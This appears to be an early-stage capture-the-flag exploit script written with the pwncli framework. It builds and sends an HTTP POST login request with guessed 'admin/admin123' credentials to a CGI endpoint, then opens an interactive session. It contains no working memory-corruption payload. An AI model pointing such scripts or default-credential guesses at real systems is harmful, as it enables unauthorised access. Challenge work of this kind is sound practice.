#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def get_payload(name, passwd):
    payload = b"POST /cgi-bin/main.cgi HTTP/1.1\r\n"
    payload += b"Host: localhost\r\n"
    payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
    payload += b"Connection: close\r\n"

    # 构建POST数据
    post_data = b"username=" + name + b"&passwd=" + passwd + b"&test=abcd"  # + b"&"
    payload += f"Content-Length: {len(post_data)}\r\n".encode()
    payload += b"\r\n"
    payload += post_data
    payload += b"\r\n"
    return payload


payload = get_payload(b"admin", b"admin123")
print(payload)
s(payload)

ia()

# dest_buf = 0x7ffff7e95100
# list = 0x7ffff7e850c0
